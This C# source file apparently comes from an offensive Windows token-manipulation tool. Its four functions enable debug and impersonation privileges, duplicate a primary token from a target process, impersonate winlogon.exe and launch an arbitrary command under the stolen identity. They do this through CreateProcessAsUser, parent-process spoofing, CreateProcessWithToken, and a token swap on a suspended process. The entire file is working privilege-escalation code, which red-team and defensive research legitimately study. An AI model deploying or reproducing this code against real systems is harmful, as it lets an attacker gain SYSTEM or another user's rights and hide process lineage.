using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using TokenAssignor.Interop;

namespace TokenAssignor.Library
{
    using NTSTATUS = Int32;
    using SIZE_T = UIntPtr;

    internal class Modules
    {
        public static bool GetTokenAssignedProcess(int nSourcePid, string command)
        {
            IntPtr hPrimaryToken;
            var hImpersonationToken = IntPtr.Zero;
            var requiredPrivs = new List<SE_PRIVILEGE_ID>
            {
                SE_PRIVILEGE_ID.SeDebugPrivilege,
                SE_PRIVILEGE_ID.SeImpersonatePrivilege
            };
            bool bSuccess = Helpers.EnableTokenPrivileges(
                in requiredPrivs,
                out Dictionary<SE_PRIVILEGE_ID, bool> privStates);

            foreach (var state in privStates)
            {
                if (state.Value)
                    Console.WriteLine("[+] {0} is enabled successfully.", state.Key.ToString());
                else
                    Console.WriteLine("[-] Failed to enable {0}.", state.Key.ToString());
            }

            if (!bSuccess)
            {
                Console.WriteLine("[-] Failed to enable required privileges (Error = 0x{0}).",
                    Marshal.GetLastWin32Error().ToString("X8"));
                return false;
            }

            do
            {
                var dupTokenPrivs = new List<SE_PRIVILEGE_ID>
                {
                    SE_PRIVILEGE_ID.SeAssignPrimaryTokenPrivilege,
                    SE_PRIVILEGE_ID.SeTcbPrivilege,
                    SE_PRIVILEGE_ID.SeIncreaseQuotaPrivilege
                };
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO))
                };
                hPrimaryToken = Helpers.GetProcessToken(nSourcePid, TOKEN_TYPE.Primary);

                if (hPrimaryToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to duplicate primary token from PID {0} (Error = 0x{1}).",
                        nSourcePid,
                        Marshal.GetLastWin32Error().ToString("X8"));
                    NativeMethods.NtClose(hImpersonationToken);
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a primary token from PID {0} (Handle = 0x{1}).",
                        nSourcePid,
                        hPrimaryToken.ToString("X"));
                }

                hImpersonationToken = Helpers.GetWinlogonToken(TOKEN_TYPE.Impersonation);

                if (hImpersonationToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to duplicate impersonation token from winlogon.exe (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a impersonation token from winlogon.exe (Handle = 0x{0}).",
                        hImpersonationToken.ToString("X"));
                }

                bSuccess = Helpers.EnableTokenPrivileges(
                    hImpersonationToken,
                    in dupTokenPrivs,
                    out privStates);

                if (!bSuccess)
                {
                    foreach (var state in privStates)
                    {
                        if (!state.Value)
                            Console.WriteLine("[-] Failed to enable {0}.", state.Key.ToString());
                    }

                    break;
                }

                bSuccess = Helpers.ImpersonateThreadToken(new IntPtr(-2), hImpersonationToken);
                NativeMethods.NtClose(hImpersonationToken);
                hImpersonationToken = IntPtr.Zero;

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to impersonate as winlogon.exe (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Impersonation as winlogon.exe is successful.");
                }

                bSuccess = NativeMethods.CreateProcessAsUser(
                    hPrimaryToken,
                    null,
                    command,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.CREATE_BREAKAWAY_FROM_JOB | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInfo);
                NativeMethods.NtClose(hPrimaryToken);
                hPrimaryToken = IntPtr.Zero;
                Helpers.RevertThreadToken(new IntPtr(-2));

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to create a process with CreateProcessAsUser() API (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] \"{0}\" is executed successfully (PID = {1}).",
                        command,
                        processInfo.dwProcessId);
                }

                Helpers.GetProcessUser(
                    processInfo.hProcess,
                    out string stringSid,
                    out string accountName,
                    out SID_NAME_USE _);
                Console.WriteLine("[*] User of the created process is {0} (SID: {1}).",
                    accountName ?? "N/A",
                    stringSid ?? "N/A");
                NativeMethods.NtResumeThread(processInfo.hThread, out uint _);
                NativeMethods.NtWaitForSingleObject(processInfo.hThread, false, IntPtr.Zero);
                NativeMethods.NtClose(processInfo.hThread);
                NativeMethods.NtClose(processInfo.hProcess);
            } while (false);

            if (hPrimaryToken != IntPtr.Zero)
                NativeMethods.NtClose(hPrimaryToken);

            if (hImpersonationToken != IntPtr.Zero)
                NativeMethods.NtClose(hImpersonationToken);

            return bSuccess;
        }


        public static bool GetTokenAssignedProcessWithParent(int nSourcePid, string command)
        {
            int nDosErrorCode;
            NTSTATUS ntstatus;
            bool bSuccess;
            var requiredPrivs = new List<SE_PRIVILEGE_ID>
            {
                SE_PRIVILEGE_ID.SeDebugPrivilege
            };
            var objectAttributes = new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
            };
            var clientId = new CLIENT_ID { UniqueProcess = new IntPtr(nSourcePid) };
            Helpers.EnableTokenPrivileges(
                in requiredPrivs,
                out Dictionary<SE_PRIVILEGE_ID, bool> privStates);

            foreach (var state in privStates)
            {
                if (state.Value)
                    Console.WriteLine("[+] {0} is enabled successfully.", state.Key.ToString());
                else
                    Console.WriteLine("[-] Failed to enable {0}.", state.Key.ToString());
            }

            ntstatus = NativeMethods.NtOpenProcess(
                out IntPtr hParentProcess,
                ACCESS_MASK.PROCESS_CREATE_PROCESS,
                in objectAttributes,
                in clientId);
            nDosErrorCode = (int)NativeMethods.RtlNtStatusToDosError(ntstatus);
            NativeMethods.RtlSetLastWin32Error(nDosErrorCode);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to open PID {0} (Error = 0x{0}).",
                    Marshal.GetLastWin32Error().ToString("X8"));
                return false;
            }
            else
            {
                Console.WriteLine("[+] Got a handle from PID {0} (Handle = 0x{1}).",
                    nSourcePid,
                    hParentProcess.ToString("X"));
            }

            do
            {
                int nInfoLength = 0;
                var startupInfoEx = new STARTUPINFOEX
                {
                    StartupInfo = new STARTUPINFO
                    {
                        cb = Marshal.SizeOf(typeof(STARTUPINFOEX)),
                        wShowWindow = SHOW_WINDOW_FLAGS.SW_SHOW,
                        lpDesktop = @"Winsta0\Default"
                    }
                };

                do
                {
                    bSuccess = NativeMethods.InitializeProcThreadAttributeList(
                        startupInfoEx.lpAttributeList,
                        1,
                        0,
                        ref nInfoLength);
                    nDosErrorCode = Marshal.GetLastWin32Error();

                    if (!bSuccess)
                    {
                        if (startupInfoEx.lpAttributeList != IntPtr.Zero)
                            Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);

                        startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(nInfoLength);

                        for (var idx = 0; idx < nInfoLength; idx++)
                            Marshal.WriteByte(startupInfoEx.lpAttributeList, idx, 0);
                    }
                } while (!bSuccess && (nDosErrorCode == Win32Consts.ERROR_INSUFFICIENT_BUFFER));

                if (!bSuccess)
                {
                    if (startupInfoEx.lpAttributeList != IntPtr.Zero)
                        Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);

                    Console.WriteLine("[-] Failed to initialize a thread attribute (Error = 0x{0}).",
                        nDosErrorCode.ToString("X8"));
                    break;
                }
                else
                {
                    IntPtr lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValue, hParentProcess);
                    bSuccess = NativeMethods.UpdateProcThreadAttribute(
                        startupInfoEx.lpAttributeList,
                        0,
                        new IntPtr((int)PROC_THREAD_ATTRIBUTES.PARENT_PROCESS),
                        lpValue,
                        new SIZE_T((uint)IntPtr.Size),
                        IntPtr.Zero,
                        IntPtr.Zero);
                    Marshal.FreeHGlobal(lpValue);
                }

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to update a thread attribute (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Thread attribute is built successfully.");
                }

                bSuccess = NativeMethods.CreateProcess(
                    null,
                    command,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.EXTENDED_STARTUPINFO_PRESENT | PROCESS_CREATION_FLAGS.CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfoEx,
                    out PROCESS_INFORMATION processInfo);

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to execute command with CreateProcess() API (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] \"{0}\" is executed successfully (PID = {1}).",
                        command,
                        processInfo.dwProcessId);
                }

                Helpers.GetProcessUser(
                    processInfo.hProcess,
                    out string stringSid,
                    out string accountName,
                    out SID_NAME_USE _);
                Console.WriteLine("[*] User of the created process is {0} (SID: {1}).",
                    accountName ?? "N/A",
                    stringSid ?? "N/A");
                NativeMethods.NtResumeThread(processInfo.hThread, out uint _);
                NativeMethods.NtClose(processInfo.hThread);
                NativeMethods.NtClose(processInfo.hProcess);
            } while (false);

            NativeMethods.NtClose(hParentProcess);

            return bSuccess;
        }


        public static bool GetTokenAssignedProcessWithSecondaryLogon(int nSourcePid, string command)
        {
            IntPtr hPrimaryToken;
            var requiredPrivs = new List<SE_PRIVILEGE_ID>
            {
                SE_PRIVILEGE_ID.SeDebugPrivilege,
                SE_PRIVILEGE_ID.SeImpersonatePrivilege
            };
            bool bSuccess = Helpers.EnableTokenPrivileges(
                in requiredPrivs,
                out Dictionary<SE_PRIVILEGE_ID, bool> privStates);

            foreach (var state in privStates)
            {
                if (state.Value)
                    Console.WriteLine("[+] {0} is enabled successfully.", state.Key.ToString());
                else
                    Console.WriteLine("[-] Failed to enable {0}.", state.Key.ToString());
            }

            if (!bSuccess)
            {
                Console.WriteLine("[-] Failed to enable required privileges (Error = 0x{0}).",
                    Marshal.GetLastWin32Error().ToString("X8"));
                return false;
            }

            do
            {
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO)),
                    wShowWindow = SHOW_WINDOW_FLAGS.SW_SHOW,
                    lpDesktop = @"Winsta0\Default"
                };
                hPrimaryToken = Helpers.GetProcessToken(nSourcePid, TOKEN_TYPE.Primary);

                if (hPrimaryToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to duplicate primary token from PID {0} (Error = 0x{1}).",
                        nSourcePid,
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a primary token from PID {0} (Handle = 0x{1}).",
                        nSourcePid,
                        hPrimaryToken.ToString("X"));
                }

                bSuccess = NativeMethods.CreateProcessWithToken(
                    hPrimaryToken,
                    LOGON_FLAGS.NONE,
                    null,
                    command,
                    PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInfo);
                NativeMethods.NtClose(hPrimaryToken);
                hPrimaryToken = IntPtr.Zero;
                Helpers.RevertThreadToken(new IntPtr(-2));

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to execute command with CreateProcessWithToken() API (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] \"{0}\" is executed successfully (PID = {1}).",
                        command,
                        processInfo.dwProcessId);
                }

                Helpers.GetProcessUser(
                    processInfo.hProcess,
                    out string stringSid,
                    out string accountName,
                    out SID_NAME_USE _);
                Console.WriteLine("[*] User of the created process is {0} (SID: {1}).",
                    accountName ?? "N/A",
                    stringSid ?? "N/A");
                NativeMethods.NtResumeThread(processInfo.hThread, out uint _);
                NativeMethods.NtClose(processInfo.hThread);
                NativeMethods.NtClose(processInfo.hProcess);
            } while (false);

            if (hPrimaryToken != IntPtr.Zero)
                NativeMethods.NtClose(hPrimaryToken);

            return bSuccess;
        }


        public static bool GetTokenAssignedProcessWithSuspend(int nSourcePid, string command)
        {
            IntPtr hPrimaryToken;
            var hImpersonationToken = IntPtr.Zero;
            var requiredPrivs = new List<SE_PRIVILEGE_ID>
            {
                SE_PRIVILEGE_ID.SeDebugPrivilege,
                SE_PRIVILEGE_ID.SeImpersonatePrivilege
            };
            bool bSuccess = Helpers.EnableTokenPrivileges(
                in requiredPrivs,
                out Dictionary<SE_PRIVILEGE_ID, bool> privStates);

            foreach (var state in privStates)
            {
                if (state.Value)
                    Console.WriteLine("[+] {0} is enabled successfully.", state.Key.ToString());
                else
                    Console.WriteLine("[-] Failed to enable {0}.", state.Key.ToString());
            }

            if (!bSuccess)
            {
                Console.WriteLine("[-] Failed to enable required privileges (Error = 0x{0}).",
                    Marshal.GetLastWin32Error().ToString("X8"));
                return false;
            }

            do
            {
                var dupTokenPrivs = new List<SE_PRIVILEGE_ID>
                {
                    SE_PRIVILEGE_ID.SeAssignPrimaryTokenPrivilege,
                    SE_PRIVILEGE_ID.SeTcbPrivilege,
                    SE_PRIVILEGE_ID.SeIncreaseQuotaPrivilege
                };
                var startupInfo = new STARTUPINFO
                {
                    cb = Marshal.SizeOf(typeof(STARTUPINFO))
                };
                hPrimaryToken = Helpers.GetProcessToken(nSourcePid, TOKEN_TYPE.Primary);

                if (hPrimaryToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to duplicate primary token from PID {0} (Error = 0x{1}).",
                        nSourcePid,
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a primary token from PID {0} (Handle = 0x{1}).",
                        nSourcePid,
                        hPrimaryToken.ToString("X"));
                }

                hImpersonationToken = Helpers.GetWinlogonToken(TOKEN_TYPE.Impersonation);

                if (hImpersonationToken == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to duplicate impersonation token from winlogon.exe (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Got a impersonation token from winlogon.exe (Handle = 0x{0}).",
                        hImpersonationToken.ToString("X"));
                }

                bSuccess = Helpers.EnableTokenPrivileges(
                    hImpersonationToken,
                    in dupTokenPrivs,
                    out privStates);

                if (!bSuccess)
                {
                    foreach (var state in privStates)
                    {
                        if (!state.Value)
                            Console.WriteLine("[-] Failed to enable {0}.", state.Key.ToString());
                    }

                    break;
                }

                bSuccess = Helpers.ImpersonateThreadToken(new IntPtr(-2), hImpersonationToken);
                NativeMethods.NtClose(hImpersonationToken);
                hImpersonationToken = IntPtr.Zero;

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to impersonate as winlogon.exe (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Impersonation as winlogon.exe is successful.");
                }

                bSuccess = NativeMethods.CreateProcess(
                    null,
                    command,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    PROCESS_CREATION_FLAGS.CREATE_BREAKAWAY_FROM_JOB | PROCESS_CREATION_FLAGS.CREATE_SUSPENDED,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    in startupInfo,
                    out PROCESS_INFORMATION processInfo);

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to create a suspended process with CreateProcess() API (Error = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    break;
                }
                else
                {
                    Console.WriteLine("[+] Suspended \"{0}\" is executed successfully (PID = {1}).",
                        command,
                        processInfo.dwProcessId);
                }

                Helpers.GetProcessUser(
                    processInfo.hProcess,
                    out string stringSid,
                    out string accountName,
                    out SID_NAME_USE _);
                Console.WriteLine("[*] Current user of the suspended process is {0} (SID: {1})",
                    accountName ?? "N/A",
                    stringSid ?? "N/A");

                bSuccess = Helpers.AssignProcessToken(processInfo.hProcess, hPrimaryToken, processInfo.hThread);
                Helpers.RevertThreadToken(new IntPtr(-2));
                NativeMethods.NtClose(hPrimaryToken);
                hPrimaryToken = IntPtr.Zero;

                if (!bSuccess)
                {
                    Console.WriteLine("[-] Failed to update primary token for the suspended process (NTSTATUS = 0x{0}).",
                        Marshal.GetLastWin32Error().ToString("X8"));
                    Console.WriteLine("[*] Terminating the suspended process.");
                    NativeMethods.NtTerminateProcess(processInfo.hProcess, Marshal.GetLastWin32Error());
                }
                else
                {
                    Console.WriteLine("[+] Primary token for the suspended process is updated successfully.");

                    Helpers.GetProcessUser(
                        processInfo.hProcess,
                        out stringSid,
                        out accountName,
                        out SID_NAME_USE _);
                    Console.WriteLine("[*] Current user of the suspended process is {0} (SID: {1})",
                        accountName ?? "N/A",
                        stringSid ?? "N/A");

                    Console.WriteLine("[*] Resuming the suspended process.");
                    NativeMethods.NtResumeThread(processInfo.hThread, out uint _);
                    NativeMethods.NtWaitForSingleObject(processInfo.hThread, false, IntPtr.Zero);
                    NativeMethods.NtClose(processInfo.hThread);
                    NativeMethods.NtClose(processInfo.hProcess);
                }
            } while (false);

            if (hPrimaryToken != IntPtr.Zero)
                NativeMethods.NtClose(hPrimaryToken);

            if (hImpersonationToken != IntPtr.Zero)
                NativeMethods.NtClose(hImpersonationToken);

            return bSuccess;
        }
    }
}